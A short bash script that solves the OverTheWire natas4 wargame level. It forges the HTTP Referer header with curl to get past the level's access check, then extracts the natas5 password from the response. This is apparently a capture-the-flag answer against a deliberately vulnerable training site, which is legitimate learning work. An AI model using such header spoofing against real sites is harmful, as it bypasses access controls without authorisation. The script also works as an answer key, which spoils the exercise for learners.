#!/bin/bash
if [ $# -eq 0 ]
  then echo "Please pass the password as argument"
else
  curl -s --referer http://natas5.natas.labs.overthewire.org/ http://natas4:$1@natas4.natas.labs.overthewire.org/ | grep -E -o 'The password for natas5 is .{32}'
fi
